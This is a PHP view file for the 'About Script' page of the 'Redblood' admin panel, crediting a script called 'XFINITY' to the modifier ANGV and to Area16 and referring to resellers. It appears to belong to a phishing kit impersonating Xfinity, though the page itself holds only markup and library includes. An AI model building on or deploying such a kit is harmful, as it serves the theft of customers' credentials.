<?php
defined("ALLOW") or exit('No direct script access allowed');
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>Admin Panel - Redblood</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <meta content="" name="keywords">
    <meta content="" name="description">
    <link href="<?= base_url() ?>REDBLOOD/Views/panel/img/favicon.ico" rel="icon">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&family=Roboto:wght@500;700&display=swap" rel="stylesheet"> 
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" rel="stylesheet">
    <link href="<?= base_url() ?>REDBLOOD/Views/panel/lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
    <link href="<?= base_url() ?>REDBLOOD/Views/panel/lib/tempusdominus/css/tempusdominus-bootstrap-4.min.css" rel="stylesheet" />
    <link href="<?= base_url() ?>REDBLOOD/Views/panel/css/bootstrap.min.css" rel="stylesheet">
    <link href="<?= base_url() ?>REDBLOOD/Views/panel/css/fxc.css" rel="stylesheet">
</head>

<body>
    <div class="container-fluid position-relative d-flex p-0">
        <!-- Spinner Start -->
        <div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center">
            <div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status">
                <span class="sr-only">Loading...</span>
            </div>
        </div>

        <?php include "sidebar.php"; ?>
        <div class="content">
            <!-- Navbar Start -->
            <?php include "navbar.php"; ?>
            <div class="container-fluid pt-4 px-4">
                <h4 class="text-center text-primary">ABOUT SCRIPT</h4>
            </div>
            <div class="text-left m-5">
                <p style="font-size:13px;" class="text-warning"><i class="fab fa-google-play text-primary m-2"></i> SCRIPT NAME : XFINITY </p>
                <p style="font-size:13px;" class="text-warning"><i class="fab fa-google-play text-primary m-2"></i> SCRIPT MODIFIER : ANGV </p>
                <p style="font-size:13px;" class="text-warning"><i class="fab fa-google-play text-primary m-2"></i> SCRIPT VERSION : 1.2 </p>
                <p style="font-size:13px;" class="text-warning"><i class="fab fa-google-play text-primary m-2"></i> RELEASE DATE : MARCH, 20th 2024 </p>
                <p style="font-size:13px;" class="text-warning"><i class="fab fa-google-play text-primary m-2"></i> AUTHOR : REDBLOOD </p><br>
                <p style="font-size:13px;" class="text-warning">
                    This script is open source, we are not responsible <br> if you get this script not from the owner or our reseller. <br>
                    Make sure the script you use is the legal version from our reseller <br> so that you can get script updates regularly if possible. <br>
                    Most of this script belongs to Area16, <br>
                    I'm just learning to develop it in my own way, <br>
                    I thank Area16 for inspiring me, Best regards from me. <br><br>

                    <strong> #ANGV </strong>
                    
                </p>
                
            </div>
        </div>
    </div>
    <!-- JavaScript Libraries -->
    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Views/panel/lib/chart/chart.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Views/panel/lib/easing/easing.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Views/panel/lib/waypoints/waypoints.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Views/panel/lib/owlcarousel/owl.carousel.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Views/panel/lib/tempusdominus/js/moment.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Views/panel/lib/tempusdominus/js/moment-timezone.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Views/panel/lib/tempusdominus/js/tempusdominus-bootstrap-4.min.js"></script>

    <!-- Template Javascript -->
    <script src="<?= base_url() ?>REDBLOOD/Views/panel/js/main.js"></script>
</body>

</html>
<?php if (@$_SESSION['sukses']) { ?>
    <script>
        <?php echo $_SESSION['sukses']; ?>
    </script>
<?php unset($_SESSION['sukses']);
} ?>

</html>